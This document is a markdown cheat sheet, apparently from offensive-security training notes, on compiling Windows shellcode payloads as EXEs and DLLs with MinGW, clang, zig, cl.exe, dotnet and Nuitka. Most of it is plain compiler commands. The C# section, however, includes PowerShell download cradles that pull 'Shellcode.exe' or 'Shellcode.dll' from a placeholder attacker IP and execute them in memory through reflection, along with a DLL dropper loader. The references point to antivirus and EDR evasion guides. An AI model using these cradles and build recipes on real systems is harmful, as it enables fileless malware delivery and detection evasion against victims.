# Windows

## 01 - MASM

```
C:\> ml /c /coff shell.asm

C:\> link /SUBSYSTEM:WINDOWS /ENTRY:start /VERSION:4.0 shell.obj

C:\> objcopy -O binary shell.exe shell.bin
```

## 02 - C

- **Compile Windows binaries in Linux**

`$ i686-w64-mingw32-gcc shellcode.c -o shell.exe`

`$ x86_64-w64-mingw32-gcc shellcode.c -o shell.exe`

`$ clang -target x86_64-pc-windows-gnu shell.c -o shell.exe`

`$ zig cc --target=x86_64-windows-gnu -static shell.c -o shell.exe`

- **Compile Windows binaries in Linux with icons**

`$ x86_64-w64-mingw32-windres resource.rc resource.o`

`$ x86_64-w64-mingw32-gcc -o shell.exe resource.o shell.c`

- **Compile Windows Dynamic Linked Library in Linux**

`$ i686-w64-mingw32-gcc shellcode.c -shared -o shell-x86.dll`

`$ x86_64-w64-mingw32-gcc shellcode.c -shared -o shell-x86_64.dll`

- **Compile Windows binaries**

`C:\> cl.exe /W4 /EHsc shellcode.c /link /out:shellcode.exe`

- **Compile Windows Dynamic Linked Library**

`C:\>`

- **Compile Windows binaries with icons**

`C:\> rc resource.rc`

`C:\> cvtres /machine:x64 /out:resource.o resource.res`

`C:\> cl.exe /nologo /0x /W0 /GS- /DNDEBUG /Tcshell.c /link /out:shell.exe /subsystem:console /machine:x64 resource.o`

## 03 - C++

- **Compile Windows binaries in Linux**

`$ i686-w64-mingw32-g++ shell.cpp -o shell.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc`

`$ x86_64-w64-mingw32-g++ shell.cpp -o shell.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive`

`$ clang++ -target x86_64-pc-windows-gnu shell.cpp -o shell.exe`

`$ zig c++ --target=x86_64-windows-gnu  -static shell.cpp -o shell.exe`

- **Compile Windows Dynamic Linked Library in Linux**

`$ i686-w64-mingw32-g++ shell.cpp -o shell.dll -shared -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc`

`$ x86_64-w64-mingw32-g++ shell.cpp -o shell.dll -shared -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive`

- **Compile Windows binaries in Windows**

`C:\> g++ shell.cpp -o shell.exe -s -static -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive`

`C:\> cl.exe /W4 /EHsc /Tcshell.cpp /link /out:shell.exe /subsystem:console /machine:x64`

`C:\> cl.exe /nologo /0x /W0 /GS- /DNDEBUG /Tcshell.cpp /link /out:shell.exe /subsystem:console /machine:x64`
- **Compile Windows Dynamic Linked Library in Windows**

`C:\> g++ shell.cpp -o shell.dll -shared -s -static -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive`

## 04 - C\#

- **Create .NET Console Project**

`C:\> dotnet new console`

- **Compile C# Project of Windows executable**

`C:\> dotnet publish -r win-x64 -c Release -p:PublishSingleFile=true --sc false -p:PublishTrimmed=true`

`C:\> dotnet publish -r win10-x64 -c Release -p:PublishSingleFile=true --sc false -p:PublishTrimmed=true`

`C:\> dotnet publish -f net6.0 -r win-x64 -c Release -p:PublishSingleFile=true --sc false -p:PublishTrimmed=true`

Or you can just use `build`

`C:\> dotnet build -r win-x64 -c Release -p:PublishSingleFile=true -p:PublishTrimmed=true`

`C:\> dotnet build -r win-x64 -c Release -p:PublishSingleFile=true -p:AllowUnsafeBlocks=true -p:PublishTrimmed=true`

`$ cat download-cradle-exe.ps1`

---

```powershell
$data = (New-Object Net.WebClient).DownloadData("http://<IP>/Shellcode.exe")
$assem = [System.Reflection.Assembly]::Load($data)
[Shell.Program()]::Main()
# [Program()]::Main()
# [Shell.Program()]::Main("".Split())
```

- **Compile C# DLL**

`C:\> dotnet new classlib`

`C:\> dotnet publish -r win-x64 -c Release --sc false -p:PublishTrimmed=true`

`C:\> dotnet build -r win-x64 -c Release --sc false -p:PublishTrimmed=true`

Allow unsafe code

`C:\> dotnet publish -r win-x64 -c Release -p:AllowUnsafeBlocks=true --sc false -p:PublishTrimmed=true`

`C:\> dotnet build -c Release -p:AllowUnsafeBlocks=true --sc false -p:PublishTrimmed=true`

Execute Shellcode

```
PS C:\> [System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("DLLDropper.dll")
PS C:\> [RunDLLPublicFunc.Class1]::runner()
```

`$ cat download-cradle-dll.ps1`

---

```powershell
$data = (New-Object Net.WebClient).DownloadData("http://<IP>/Shellcode.dll")
$assembly = [System.Reflection.Assembly]::Load($data)
$class = $assembly.GetType("Shellcode.Class1")
$method = $class.GetMethod("<method_name>")
$method.Invoke(0, $null)
```

## 05 - Python

`$ nuitka.bat --onefile shell.py`

---
## References

- [EDR and Blending In: How Attackers Avoid Getting Caught](https://www.optiv.com/insights/source-zero/blog/edr-and-blending-how-attackers-avoid-getting-caught)

- [Quickpost Compiling EXEs and Resources with Mingw on Kali](https://blog.didierstevens.com/2018/09/17/quickpost-compiling-exes-and-resources-with-mingw-on-kali/)

- [Zig C Compiler Powerful Drop in Replacment GCC Clang](https://andrewkelley.me/post/zig-cc-powerful-drop-in-replacement-gcc-clang.html)

- [Purpl3f0xsecur1ty.tech AV Evasion.html](https://www.purpl3f0xsecur1ty.tech/2021/03/30/av_evasion.html)

- [https://medium.com/@carlosprincipal1/how-to-bypass-antivirus-av-2020-easy-method-69749892928b](https://medium.com/@carlosprincipal1/how-to-bypass-antivirus-av-2020-easy-method-69749892928b)

- [https://github.com/In3x0rabl3/OSEP](https://github.com/In3x0rabl3/OSEP)

- [https://dotnet.microsoft.com/en-us/download/dotnet-framework/net481](https://dotnet.microsoft.com/en-us/download/dotnet-framework/net481)

- [Nuitka](https://nuitka.net/)